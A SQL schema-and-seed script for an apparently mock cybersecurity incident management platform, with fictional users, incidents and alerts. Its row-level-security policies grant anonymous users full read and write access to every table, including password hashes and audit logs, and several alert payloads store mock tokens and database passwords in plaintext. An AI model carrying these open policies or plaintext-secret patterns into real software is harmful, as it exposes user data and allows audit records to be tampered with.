-- ==============================================================================
-- CYBERSECURITY INCIDENT MANAGEMENT PLATFORM - SUPABASE COMPLETE DATABASE SETUP
-- Target: PostgreSQL / Supabase public schema
-- Generated: 2026-09-30T17:10:45.793Z
-- ==============================================================================

-- 1. DROP EXISTING TABLES (Clean Slate)
DROP TABLE IF EXISTS public.live_events CASCADE;
DROP TABLE IF EXISTS public.audit_logs CASCADE;
DROP TABLE IF EXISTS public.timeline CASCADE;
DROP TABLE IF EXISTS public.diagnostics CASCADE;
DROP TABLE IF EXISTS public.approvals CASCADE;
DROP TABLE IF EXISTS public.tasks CASCADE;
DROP TABLE IF EXISTS public.evidence CASCADE;
DROP TABLE IF EXISTS public.alerts CASCADE;
DROP TABLE IF EXISTS public.incidents CASCADE;
DROP TABLE IF EXISTS public.simulations CASCADE;
DROP TABLE IF EXISTS public.integrations CASCADE;
DROP TABLE IF EXISTS public.runbooks CASCADE;
DROP TABLE IF EXISTS public.users CASCADE;

-- 2. CREATE TABLES

CREATE TABLE public.users (
  id TEXT PRIMARY KEY,
  name TEXT NOT NULL,
  email TEXT UNIQUE NOT NULL,
  avatar TEXT,
  role TEXT NOT NULL,
  title TEXT,
  department TEXT,
  status TEXT DEFAULT 'Active',
  last_login TIMESTAMPTZ,
  permissions JSONB DEFAULT '[]'::jsonb,
  password_hash TEXT,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

CREATE TABLE public.incidents (
  id TEXT PRIMARY KEY,
  title TEXT NOT NULL,
  description TEXT,
  severity TEXT NOT NULL,
  status TEXT NOT NULL,
  incident_commander TEXT NOT NULL,
  assigned_responder TEXT NOT NULL,
  created_time TIMESTAMPTZ NOT NULL,
  updated_time TIMESTAMPTZ NOT NULL,
  resolved_time TIMESTAMPTZ,
  affected_service TEXT NOT NULL,
  affected_systems JSONB DEFAULT '[]'::jsonb,
  tags JSONB DEFAULT '[]'::jsonb,
  mtta_minutes INTEGER DEFAULT 0,
  mttr_minutes INTEGER,
  related_alert_ids JSONB DEFAULT '[]'::jsonb,
  ai_summary JSONB,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

CREATE TABLE public.alerts (
  id TEXT PRIMARY KEY,
  title TEXT NOT NULL,
  source TEXT NOT NULL,
  timestamp TIMESTAMPTZ NOT NULL,
  severity TEXT NOT NULL,
  status TEXT NOT NULL,
  affected_service TEXT NOT NULL,
  detection_type TEXT,
  assigned_responder TEXT,
  related_incident_id TEXT,
  raw_payload JSONB DEFAULT '{}'::jsonb,
  history JSONB DEFAULT '[]'::jsonb,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

CREATE TABLE public.evidence (
  id TEXT PRIMARY KEY,
  incident_id TEXT NOT NULL,
  title TEXT NOT NULL,
  type TEXT NOT NULL,
  description TEXT,
  content TEXT,
  source TEXT,
  collected_by TEXT NOT NULL,
  collection_timestamp TIMESTAMPTZ NOT NULL,
  hash TEXT NOT NULL,
  hash_verified BOOLEAN DEFAULT true,
  chain_of_custody JSONB DEFAULT '[]'::jsonb,
  redacted BOOLEAN DEFAULT false,
  file_size TEXT,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

CREATE TABLE public.tasks (
  id TEXT PRIMARY KEY,
  incident_id TEXT NOT NULL,
  title TEXT NOT NULL,
  description TEXT,
  assigned_to TEXT NOT NULL,
  assigned_to_avatar TEXT,
  priority TEXT NOT NULL,
  status TEXT NOT NULL,
  due_time TIMESTAMPTZ NOT NULL,
  created_time TIMESTAMPTZ NOT NULL,
  completion_time TIMESTAMPTZ,
  approval_required BOOLEAN DEFAULT false,
  approval_request_id TEXT,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

CREATE TABLE public.approvals (
  id TEXT PRIMARY KEY,
  incident_id TEXT NOT NULL,
  incident_title TEXT NOT NULL,
  action_title TEXT NOT NULL,
  requested_action TEXT NOT NULL,
  requested_by TEXT NOT NULL,
  ai_recommendation_source TEXT,
  risk_level TEXT NOT NULL,
  reason TEXT NOT NULL,
  required_permission TEXT NOT NULL,
  created_time TIMESTAMPTZ NOT NULL,
  expiration_time TIMESTAMPTZ NOT NULL,
  status TEXT NOT NULL,
  reviewed_by TEXT,
  review_timestamp TIMESTAMPTZ,
  review_comment TEXT,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

CREATE TABLE public.diagnostics (
  id TEXT PRIMARY KEY,
  incident_id TEXT NOT NULL,
  action_name TEXT NOT NULL,
  description TEXT,
  why_recommended TEXT,
  expected_information_gain TEXT,
  risk_level TEXT NOT NULL,
  required_permission TEXT NOT NULL,
  approval_required BOOLEAN DEFAULT true,
  status TEXT NOT NULL,
  execution_result TEXT,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

CREATE TABLE public.timeline (
  id TEXT PRIMARY KEY,
  timestamp TIMESTAMPTZ NOT NULL,
  type TEXT NOT NULL,
  title TEXT NOT NULL,
  description TEXT,
  actor TEXT NOT NULL,
  metadata JSONB DEFAULT '{}'::jsonb,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

CREATE TABLE public.audit_logs (
  id TEXT PRIMARY KEY,
  timestamp TIMESTAMPTZ NOT NULL,
  user_name TEXT NOT NULL,
  role TEXT NOT NULL,
  action TEXT NOT NULL,
  resource TEXT NOT NULL,
  incident_id TEXT,
  ip_address TEXT,
  user_agent TEXT,
  result TEXT NOT NULL,
  previous_state_hash TEXT,
  current_state_hash TEXT,
  details TEXT,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

CREATE TABLE public.integrations (
  id TEXT PRIMARY KEY,
  name TEXT NOT NULL,
  type TEXT NOT NULL,
  status TEXT NOT NULL,
  last_event_time TIMESTAMPTZ,
  events_received_count INTEGER DEFAULT 0,
  webhook_url TEXT,
  secret_masked TEXT,
  enabled BOOLEAN DEFAULT true,
  description TEXT,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

CREATE TABLE public.simulations (
  id TEXT PRIMARY KEY,
  name TEXT NOT NULL,
  category TEXT NOT NULL,
  description TEXT,
  severity TEXT NOT NULL,
  symptoms JSONB DEFAULT '[]'::jsonb,
  mock_alerts JSONB DEFAULT '[]'::jsonb,
  steps JSONB DEFAULT '[]'::jsonb,
  expected_diagnostics JSONB DEFAULT '[]'::jsonb,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

CREATE TABLE public.runbooks (
  id TEXT PRIMARY KEY,
  name TEXT NOT NULL,
  category TEXT NOT NULL,
  version TEXT NOT NULL,
  approval_status TEXT NOT NULL,
  last_reviewed_date TIMESTAMPTZ,
  owner TEXT NOT NULL,
  matched_incident_types JSONB DEFAULT '[]'::jsonb,
  description TEXT,
  steps JSONB DEFAULT '[]'::jsonb,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

CREATE TABLE public.live_events (
  id TEXT PRIMARY KEY,
  timestamp TIMESTAMPTZ NOT NULL,
  category TEXT NOT NULL,
  severity TEXT NOT NULL,
  title TEXT NOT NULL,
  description TEXT,
  source TEXT,
  incident_id TEXT,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- 3. ENABLE RLS & CREATE POLICIES (Allowing Authenticated & Anon Access for App Operation)
ALTER TABLE public.users ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Allow public anon and authenticated full access on users" ON public.users FOR ALL USING (true) WITH CHECK (true);

ALTER TABLE public.incidents ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Allow public anon and authenticated full access on incidents" ON public.incidents FOR ALL USING (true) WITH CHECK (true);

ALTER TABLE public.alerts ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Allow public anon and authenticated full access on alerts" ON public.alerts FOR ALL USING (true) WITH CHECK (true);

ALTER TABLE public.evidence ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Allow public anon and authenticated full access on evidence" ON public.evidence FOR ALL USING (true) WITH CHECK (true);

ALTER TABLE public.tasks ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Allow public anon and authenticated full access on tasks" ON public.tasks FOR ALL USING (true) WITH CHECK (true);

ALTER TABLE public.approvals ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Allow public anon and authenticated full access on approvals" ON public.approvals FOR ALL USING (true) WITH CHECK (true);

ALTER TABLE public.diagnostics ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Allow public anon and authenticated full access on diagnostics" ON public.diagnostics FOR ALL USING (true) WITH CHECK (true);

ALTER TABLE public.timeline ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Allow public anon and authenticated full access on timeline" ON public.timeline FOR ALL USING (true) WITH CHECK (true);

ALTER TABLE public.audit_logs ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Allow public anon and authenticated full access on audit_logs" ON public.audit_logs FOR ALL USING (true) WITH CHECK (true);

ALTER TABLE public.integrations ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Allow public anon and authenticated full access on integrations" ON public.integrations FOR ALL USING (true) WITH CHECK (true);

ALTER TABLE public.simulations ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Allow public anon and authenticated full access on simulations" ON public.simulations FOR ALL USING (true) WITH CHECK (true);

ALTER TABLE public.runbooks ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Allow public anon and authenticated full access on runbooks" ON public.runbooks FOR ALL USING (true) WITH CHECK (true);

ALTER TABLE public.live_events ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Allow public anon and authenticated full access on live_events" ON public.live_events FOR ALL USING (true) WITH CHECK (true);

-- ==============================================================================
-- 4. INSERT INITIAL SEED DATA
-- ==============================================================================

-- Users Seed
INSERT INTO public.users (id, name, email, avatar, role, title, department, status, last_login, permissions, password_hash)
VALUES ('usr-1', 'Sarah Connor', 'sarah.connor@cyberops.corp', 'https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=120&auto=format&fit=crop&q=80', 'Admin', 'VP of Information Security', 'SecOps', 'Active', '2026-09-30T14:12:00Z', '["view_alerts","manage_incidents","view_evidence","add_evidence","manage_tasks","view_runbooks","request_approval","approve_actions","view_audit_logs","manage_users","manage_integrations"]'::jsonb, 'pbkdf2_sha256$260000$mock_salt$mock_hash')
ON CONFLICT (id) DO UPDATE SET name = EXCLUDED.name, email = EXCLUDED.email, role = EXCLUDED.role;

INSERT INTO public.users (id, name, email, avatar, role, title, department, status, last_login, permissions, password_hash)
VALUES ('usr-2', 'Marcus Vance', 'marcus.vance@cyberops.corp', 'https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=120&auto=format&fit=crop&q=80', 'Incident Commander', 'Lead Incident Commander', 'CSIRT', 'On Call', '2026-09-30T14:35:00Z', '["view_alerts","manage_incidents","view_evidence","add_evidence","manage_tasks","view_runbooks","request_approval","approve_actions","view_audit_logs","manage_integrations"]'::jsonb, 'pbkdf2_sha256$260000$mock_salt$mock_hash')
ON CONFLICT (id) DO UPDATE SET name = EXCLUDED.name, email = EXCLUDED.email, role = EXCLUDED.role;

INSERT INTO public.users (id, name, email, avatar, role, title, department, status, last_login, permissions, password_hash)
VALUES ('usr-3', 'Elena Rostova', 'elena.r@cyberops.corp', 'https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?w=120&auto=format&fit=crop&q=80', 'Security Analyst', 'Senior SOC Threat Hunter', 'SOC Tier 3', 'Active', '2026-09-30T14:50:00Z', '["view_alerts","manage_incidents","view_evidence","add_evidence","manage_tasks","view_runbooks","request_approval","view_audit_logs"]'::jsonb, 'pbkdf2_sha256$260000$mock_salt$mock_hash')
ON CONFLICT (id) DO UPDATE SET name = EXCLUDED.name, email = EXCLUDED.email, role = EXCLUDED.role;

INSERT INTO public.users (id, name, email, avatar, role, title, department, status, last_login, permissions, password_hash)
VALUES ('usr-4', 'David Chen', 'david.chen@cyberops.corp', 'https://images.unsplash.com/photo-1500648767791-00dcc994a43e?w=120&auto=format&fit=crop&q=80', 'Responder', 'Infrastructure & Site Reliability Engineer', 'SRE / Cloud Ops', 'Active', '2026-09-30T13:40:00Z', '["view_alerts","view_evidence","add_evidence","manage_tasks","view_runbooks","request_approval"]'::jsonb, 'pbkdf2_sha256$260000$mock_salt$mock_hash')
ON CONFLICT (id) DO UPDATE SET name = EXCLUDED.name, email = EXCLUDED.email, role = EXCLUDED.role;

INSERT INTO public.users (id, name, email, avatar, role, title, department, status, last_login, permissions, password_hash)
VALUES ('usr-5', 'Rachel Sterling', 'rachel.s@cyberops.corp', 'https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=120&auto=format&fit=crop&q=80', 'Auditor', 'Compliance & Governance Officer', 'GRC', 'Active', '2026-09-30T11:00:00Z', '["view_alerts","view_evidence","view_runbooks","view_audit_logs"]'::jsonb, 'pbkdf2_sha256$260000$mock_salt$mock_hash')
ON CONFLICT (id) DO UPDATE SET name = EXCLUDED.name, email = EXCLUDED.email, role = EXCLUDED.role;

INSERT INTO public.users (id, name, email, avatar, role, title, department, status, last_login, permissions, password_hash)
VALUES ('usr-6', 'Alex Rivera', 'alex.rivera@cyberops.corp', 'https://images.unsplash.com/photo-1519085360753-af0119f7cbe7?w=120&auto=format&fit=crop&q=80', 'Viewer', 'Technical Product Manager', 'Product', 'Offline', '2026-09-29T18:20:00Z', '["view_alerts"]'::jsonb, 'pbkdf2_sha256$260000$mock_salt$mock_hash')
ON CONFLICT (id) DO UPDATE SET name = EXCLUDED.name, email = EXCLUDED.email, role = EXCLUDED.role;

-- Incidents Seed
INSERT INTO public.incidents (id, title, description, severity, status, incident_commander, assigned_responder, created_time, updated_time, resolved_time, affected_service, affected_systems, tags, mtta_minutes, mttr_minutes, related_alert_ids, ai_summary)
VALUES ('INC-2026-0891', 'Critical Gateway Latency & 504 Storm on Payment API', 'High error rate (>35% 504 Gateway Timeout) on the primary payment processing gateway causing customer transaction drops.', 'Critical', 'Investigating', 'Marcus Vance', 'David Chen', '2026-09-30T14:48:00Z', '2026-09-30T15:05:00Z', NULL, 'payment-gateway-api', '["payment-gw-prod-01","payment-gw-prod-02","stripe-bridge-service","k8s-ingress-prod"]'::jsonb, '["Payment","Latency","5xx-Errors","Critical-Path"]'::jsonb, 2, NULL, '["ALT-9041","ALT-9049"]'::jsonb, '{"summary":"Payment API gateway experiencing severe degradation with 38% HTTP 504 gateway timeout responses across US-East-1.","whatHappened":"At 14:48 UTC, Envoy ingress proxy reported a rapid surge in upstream connection queue saturation, correlating with uncharacteristic slow payloads.","startedAt":"2026-09-30T14:48:00Z","affectedSystems":["payment-gateway-api","k8s-ingress-prod","stripe-bridge-service"],"currentImpact":"Direct impact on checkout workflows. Approximately 420 customer transactions failed over the last 15 minutes.","knownIndicators":["p99 latency escalated from 120ms to 12,450ms","Ingress connection pool exhaustion in pod cluster payment-svc","Simultaneous SQLi scan activity detected from ASN 14061"],"responseStatus":"Incident commander Marcus Vance coordinating mitigation. Diagnostic thread dump requested.","recommendedNextSteps":["Check database connection pool metrics for payment-gateway backend","Inspect upstream envoy proxy error distribution","Evaluate activating circuit breaker fallback to secondary processor"],"generatedAt":"2026-09-30T15:02:00Z"}'::jsonb)
ON CONFLICT (id) DO NOTHING;

INSERT INTO public.incidents (id, title, description, severity, status, incident_commander, assigned_responder, created_time, updated_time, resolved_time, affected_service, affected_systems, tags, mtta_minutes, mttr_minutes, related_alert_ids, ai_summary)
VALUES ('INC-2026-0892', 'High-Volume Distributed Credential Stuffing Campaign', 'Over 8,000 automated authentication attempts per minute targeting corporate SSO and external customer API tokens.', 'Critical', 'Mitigating', 'Marcus Vance', 'Elena Rostova', '2026-09-30T14:32:00Z', '2026-09-30T15:10:00Z', NULL, 'auth-service', '["okta-sso-gateway","auth0-proxy","customer-identity-vault"]'::jsonb, '["Brute-Force","Identity","Botnet","WAF"]'::jsonb, 2, NULL, '["ALT-9042"]'::jsonb, '{"summary":"Coordinated credential stuffing attack detected across 412 distinct proxy IPs targeting authentication endpoints.","whatHappened":"A botnet began rotating leaked username/password combos against /v1/auth/login with high concurrency.","startedAt":"2026-09-30T14:32:00Z","affectedSystems":["auth-service","okta-sso-gateway"],"currentImpact":"No confirmed account takeovers detected yet. 18 accounts temporarily locked due to failed attempt thresholds.","knownIndicators":["Spike in failed authentication requests (8,420 attempts)","Botnet user-agents masquerading as legacy mobile apps","Requests distributed over 18 residential ASNs"],"responseStatus":"Rate limiting implemented at edge WAF. Step-up MFA challenge pending Commander approval.","recommendedNextSteps":["Inspect top 20 attacking ASN blocks for edge CIDR null-route","Verify compromised credential list against HaveIBeenPwned API","Issue mandatory password reset for 18 locked accounts"],"generatedAt":"2026-09-30T14:45:00Z"}'::jsonb)
ON CONFLICT (id) DO NOTHING;

INSERT INTO public.incidents (id, title, description, severity, status, incident_commander, assigned_responder, created_time, updated_time, resolved_time, affected_service, affected_systems, tags, mtta_minutes, mttr_minutes, related_alert_ids, ai_summary)
VALUES ('INC-2026-0893', 'PostgreSQL Primary Connection Exhaustion & Lock Contention', 'Primary transactional database reached 98% connection limit with multiple blocked queries on the orders table.', 'High', 'Investigating', 'Marcus Vance', 'David Chen', '2026-09-30T14:20:00Z', '2026-09-30T14:55:00Z', NULL, 'postgresql-primary-cluster', '["pg-primary-01","pg-replica-01","pgbouncer-pool-01"]'::jsonb, '["Database","Postgres","PgBouncer","Locks"]'::jsonb, 4, NULL, '["ALT-9043"]'::jsonb, '{"summary":"PostgreSQL connection starvation triggered by an unindexed reporting query holding an exclusive row lock on orders_v2.","whatHappened":"Analytics batch job spawned unthrottled worker threads at 14:18 UTC, filling PgBouncer client pool.","startedAt":"2026-09-30T14:20:00Z","affectedSystems":["postgresql-primary-cluster","pgbouncer-pool-01"],"currentImpact":"Query wait times elevated to 14.2s. Web application experiencing intermittent 500 error cascades.","knownIndicators":["982 / 1000 connections occupied","PID 4491 holding ExclusiveLock on orders_v2 for 1,480s","PgBouncer queue latency > 8000ms"],"responseStatus":"DBA team examining query plan. Diagnostic query termination awaiting approval.","recommendedNextSteps":["Execute safe pg_cancel_backend on PID 4491 after approval","Verify query pool depth on PgBouncer","Isolate analytics queries to read-only replica pg-replica-01"],"generatedAt":"2026-09-30T14:35:00Z"}'::jsonb)
ON CONFLICT (id) DO NOTHING;

INSERT INTO public.incidents (id, title, description, severity, status, incident_commander, assigned_responder, created_time, updated_time, resolved_time, affected_service, affected_systems, tags, mtta_minutes, mttr_minutes, related_alert_ids, ai_summary)
VALUES ('INC-2026-0894', 'Unauthorized IAM Privilege Escalation on Production Role', 'Security policy breach: AdministratorAccess policy attached to non-privileged data pipeline instance profile.', 'High', 'Investigating', 'Sarah Connor', 'Elena Rostova', '2026-09-30T13:50:00Z', '2026-09-30T14:30:00Z', NULL, 'aws-iam-identity', '["ProdDataPipelineRole","data-pipeline-k8s-pod","aws-iam"]'::jsonb, '["IAM","Privilege-Escalation","CloudTrail","AWS"]'::jsonb, 3, NULL, '["ALT-9044"]'::jsonb, '{"summary":"CloudTrail captured an unauthorized AttachRolePolicy call giving full AdministratorAccess to an internal EC2 instance profile.","whatHappened":"An automated deployment script with elevated STS tokens ran outside scheduled CI/CD change windows.","startedAt":"2026-09-30T13:50:00Z","affectedSystems":["aws-iam-identity","ProdDataPipelineRole"],"currentImpact":"Potential over-privileged credential exposure. No anomalous API calls made using the role so far.","knownIndicators":["Call initiated from source IP 198.51.100.44","Target policy: arn:aws:iam::aws:policy/AdministratorAccess","Event ID: evt-cloudtrail-991204"],"responseStatus":"Role permissions detached; analyst reviewing CloudTrail session replay.","recommendedNextSteps":["Audit all API calls made by ProdDataPipelineRole in the last 60 minutes","Revoke temporary STS session tokens for the instance profile","Lock IAM policy modification behind CI/CD GitOps workflow only"],"generatedAt":"2026-09-30T14:15:00Z"}'::jsonb)
ON CONFLICT (id) DO NOTHING;

INSERT INTO public.incidents (id, title, description, severity, status, incident_commander, assigned_responder, created_time, updated_time, resolved_time, affected_service, affected_systems, tags, mtta_minutes, mttr_minutes, related_alert_ids, ai_summary)
VALUES ('INC-2026-0895', 'Anomalous Outbound C2 Beaconing on Worker Node k8s-04', 'Threat detection signature triggered on outbound SSH traffic to known adversary command and control IP address.', 'Critical', 'Mitigating', 'Marcus Vance', 'Elena Rostova', '2026-09-30T13:15:00Z', '2026-09-30T14:40:00Z', NULL, 'k8s-worker-node-04', '["k8s-worker-node-04","containerd-runtime","vpc-prod-subnet-b"]'::jsonb, '["C2","CrowdStrike","Malware","Containment"]'::jsonb, 1, NULL, '["ALT-9045"]'::jsonb, '{"summary":"Host k8s-worker-node-04 established unauthorized encrypted tunnel to malicious C2 infrastructure (185.220.101.5).","whatHappened":"A vulnerable base image container was exploited via known remote code execution vulnerability (CVE-2024-38063).","startedAt":"2026-09-30T13:15:00Z","affectedSystems":["k8s-worker-node-04"],"currentImpact":"Node isolated at VPC security group level. Workloads cordoned and drained to adjacent nodes.","knownIndicators":["Binary execution from /tmp/.hidden_kswapd","Repeated TCP connect on port 2222","Match with CrowdStrike Falcon adversary adversary group FANCY_BEAR"],"responseStatus":"Forensic volatile memory captured. Awaiting Commander authorization for full instance termination.","recommendedNextSteps":["Inspect surrounding nodes in subnet for lateral movement indicators","Validate cryptographic hashes of all container images deployed today","Submit memory dump to sandbox analysis pipeline"],"generatedAt":"2026-09-30T13:30:00Z"}'::jsonb)
ON CONFLICT (id) DO NOTHING;

INSERT INTO public.incidents (id, title, description, severity, status, incident_commander, assigned_responder, created_time, updated_time, resolved_time, affected_service, affected_systems, tags, mtta_minutes, mttr_minutes, related_alert_ids, ai_summary)
VALUES ('INC-2026-0888', 'Customer Onboarding Microservice Memory Leak & Latency Degradation', 'Progressive memory leak causing GC pauses over 1500ms and eventual pod crash loops in eu-central-1 region.', 'Medium', 'Resolved', 'Marcus Vance', 'David Chen', '2026-09-30T09:10:00Z', '2026-09-30T11:45:00Z', '2026-09-30T11:45:00Z', 'onboarding-microservice', '["onboarding-api-eu-01","onboarding-api-eu-02"]'::jsonb, '["Memory-Leak","OOM","Performance","Resolved"]'::jsonb, 5, 155, '["ALT-9046"]'::jsonb, '{"summary":"Unbounded heap allocation in customer PDF generation module caused memory exhaustion and repeated pod evictions.","whatHappened":"V2.1.4 release included unclosed file handles in headless chromium worker pool.","startedAt":"2026-09-30T09:10:00Z","affectedSystems":["onboarding-microservice"],"currentImpact":"Resolved. Hotfix patch v2.1.5 deployed and verified stable for 2 hours.","knownIndicators":["Linear heap climb to 4GB cgroup limit","GC STW pause duration > 1.8s"],"responseStatus":"Closed after validation in staging & production.","recommendedNextSteps":["Introduce automated memory leak regression testing into CI pipeline."],"generatedAt":"2026-09-30T11:50:00Z"}'::jsonb)
ON CONFLICT (id) DO NOTHING;

INSERT INTO public.incidents (id, title, description, severity, status, incident_commander, assigned_responder, created_time, updated_time, resolved_time, affected_service, affected_systems, tags, mtta_minutes, mttr_minutes, related_alert_ids, ai_summary)
VALUES ('INC-2026-0885', 'DNS Resolution Intermittent Failures on Internal CoreDNS', 'Internal microservices intermittently failing to resolve service meshes and database endpoints.', 'Low', 'Closed', 'Sarah Connor', 'David Chen', '2026-09-29T16:00:00Z', '2026-09-29T17:30:00Z', '2026-09-29T17:30:00Z', 'coredns-infrastructure', '["coredns-k8s-01","coredns-k8s-02"]'::jsonb, '["DNS","Networking","CoreDNS","Closed"]'::jsonb, 8, 90, '[]'::jsonb, '{"summary":"Upstream AWS VPC DNS rate throttling caused temporary NXDOMAIN returns during deployment peak.","whatHappened":"High frequency DNS lookups without local caching daemon.","startedAt":"2026-09-29T16:00:00Z","affectedSystems":["coredns-infrastructure"],"currentImpact":"Resolved by enabling NodeLocal DNSCache daemonset across worker fleet.","knownIndicators":["UDP 53 timeout rate > 4%"],"responseStatus":"Closed. No recurring anomalies.","recommendedNextSteps":["Document DNS caching best practices for new containerized services."],"generatedAt":"2026-09-29T17:35:00Z"}'::jsonb)
ON CONFLICT (id) DO NOTHING;

-- Alerts Seed
INSERT INTO public.alerts (id, title, source, timestamp, severity, status, affected_service, detection_type, assigned_responder, related_incident_id, raw_payload, history)
VALUES ('ALT-9041', 'Repeated HTTP 504 Gateway Timeouts on Core Payment API', 'Cloudflare WAF & Envoy', '2026-09-30T14:48:00Z', 'Critical', 'Escalated', 'payment-gateway-api', 'Threshold Anomaly (>25% 5xx errors for 3m)', 'Marcus Vance', 'INC-2026-0891', '{"cluster":"prod-us-east-1","p99_latency_ms":12450,"client_error_rate":0.38,"auth_header_sample":"Authorization: Bearer sk_mock_9942a8b27c19f091823abce18293d","upstream_node":"payment-svc-pod-77b8f99d-xk29"}'::jsonb, '[{"timestamp":"2026-09-30T14:48:00Z","action":"Triggered by Envoy telemetry","actor":"System"},{"timestamp":"2026-09-30T14:50:00Z","action":"Escalated to INC-2026-0891","actor":"Elena Rostova"}]'::jsonb)
ON CONFLICT (id) DO NOTHING;

INSERT INTO public.alerts (id, title, source, timestamp, severity, status, affected_service, detection_type, assigned_responder, related_incident_id, raw_payload, history)
VALUES ('ALT-9042', 'Distributed Credential Replay Spike Against /v1/auth/login', 'Okta Verify & AWS WAF', '2026-09-30T14:32:00Z', 'Critical', 'Escalated', 'auth-service', 'Brute Force / Credential Stuffing Pattern', 'Elena Rostova', 'INC-2026-0892', '{"failed_attempts_count":8420,"distinct_ips":412,"origin_asn":["AS16276","AS14061"],"sample_payload":"user=admin&password=Password123!&api_secret=sk_mock_auth_9812739182470129"}'::jsonb, '[{"timestamp":"2026-09-30T14:32:00Z","action":"High velocity alert raised","actor":"Okta SIEM"},{"timestamp":"2026-09-30T14:34:00Z","action":"Correlated with active botnet signatures","actor":"Elena Rostova"}]'::jsonb)
ON CONFLICT (id) DO NOTHING;

INSERT INTO public.alerts (id, title, source, timestamp, severity, status, affected_service, detection_type, assigned_responder, related_incident_id, raw_payload, history)
VALUES ('ALT-9043', 'PostgreSQL Primary Node Connection Pool Exhaustion (98%)', 'Datadog Database Monitoring', '2026-09-30T14:20:00Z', 'High', 'Escalated', 'postgresql-primary-cluster', 'Resource Saturation', 'David Chen', 'INC-2026-0893', '{"active_connections":982,"max_connections":1000,"waiting_clients":145,"db_uri":"postgresql://db_app_user:db_pass=SuperSecret9912!@postgres-prod.internal:5432/core_db"}'::jsonb, '[{"timestamp":"2026-09-30T14:20:00Z","action":"Alert triggered","actor":"Datadog APM"}]'::jsonb)
ON CONFLICT (id) DO NOTHING;

INSERT INTO public.alerts (id, title, source, timestamp, severity, status, affected_service, detection_type, assigned_responder, related_incident_id, raw_payload, history)
VALUES ('ALT-9044', 'Unauthorized IAM Role Policy Modification Detected', 'AWS CloudTrail & GuardDuty', '2026-09-30T13:50:00Z', 'High', 'Escalated', 'aws-iam-identity', 'Privilege Escalation Event', 'Marcus Vance', 'INC-2026-0894', '{"event_name":"AttachRolePolicy","role_arn":"arn:aws:iam::112233445566:role/ProdDataPipelineRole","caller_identity":"AKIAIOSFODNN7EXAMPLE","source_ip":"198.51.100.44"}'::jsonb, '[{"timestamp":"2026-09-30T13:50:00Z","action":"CloudTrail Event Dispatched","actor":"GuardDuty"}]'::jsonb)
ON CONFLICT (id) DO NOTHING;

INSERT INTO public.alerts (id, title, source, timestamp, severity, status, affected_service, detection_type, assigned_responder, related_incident_id, raw_payload, history)
VALUES ('ALT-9045', 'Anomalous Outbound SSH Traffic to Known C2 IP Range', 'Suricata NIDS / CrowdStrike', '2026-09-30T13:15:00Z', 'Critical', 'Escalated', 'k8s-worker-node-04', 'C2 Beaconing Pattern', 'Elena Rostova', 'INC-2026-0895', '{"dest_ip":"185.220.101.5","dest_port":2222,"packet_count":1480,"process_name":"/tmp/.hidden_kswapd","hash":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"}'::jsonb, '[{"timestamp":"2026-09-30T13:15:00Z","action":"Suricata signature fired","actor":"NIDS"}]'::jsonb)
ON CONFLICT (id) DO NOTHING;

INSERT INTO public.alerts (id, title, source, timestamp, severity, status, affected_service, detection_type, assigned_responder, related_incident_id, raw_payload, history)
VALUES ('ALT-9046', 'Kubernetes Pod Memory Limit Breached & OOMKilled', 'Prometheus / AlertManager', '2026-09-30T14:40:00Z', 'Medium', 'Triaged', 'analytics-worker-consumer', 'Container Lifecycle Event', 'David Chen', NULL, '{"namespace":"production","container":"worker-engine","restart_count":4,"oom_timestamp":"2026-09-30T14:39:58Z"}'::jsonb, '[{"timestamp":"2026-09-30T14:40:00Z","action":"Pod restart recorded","actor":"AlertManager"}]'::jsonb)
ON CONFLICT (id) DO NOTHING;

INSERT INTO public.alerts (id, title, source, timestamp, severity, status, affected_service, detection_type, assigned_responder, related_incident_id, raw_payload, history)
VALUES ('ALT-9047', 'Spike in Geo-IP Impossible Travel for Support Lead', 'Okta Identity Cloud', '2026-09-30T12:05:00Z', 'Medium', 'Triaged', 'okta-sso-gateway', 'Impossible Travel Velocity', 'Elena Rostova', NULL, '{"account":"donna.noble@cyberops.corp","origin_1":"London, UK (12:00:10)","origin_2":"Lagos, Nigeria (12:05:22)","client_agent":"Python-requests/2.28.1"}'::jsonb, '[{"timestamp":"2026-09-30T12:05:00Z","action":"MFA prompt challenged","actor":"Okta"}]'::jsonb)
ON CONFLICT (id) DO NOTHING;

INSERT INTO public.alerts (id, title, source, timestamp, severity, status, affected_service, detection_type, assigned_responder, related_incident_id, raw_payload, history)
VALUES ('ALT-9048', 'TLS Certificate Expiration Approaching (< 7 Days)', 'CertManager Operator', '2026-09-30T10:00:00Z', 'Low', 'New', 'internal-vault-cluster', 'Certificate Lifecycle Warning', 'David Chen', NULL, '{"domain":"vault.internal.cyberops.corp","expiry_date":"2026-10-06T23:59:59Z","issuer":"Internal Corporate CA"}'::jsonb, '[{"timestamp":"2026-09-30T10:00:00Z","action":"Certificate renewal scheduled","actor":"CertManager"}]'::jsonb)
ON CONFLICT (id) DO NOTHING;

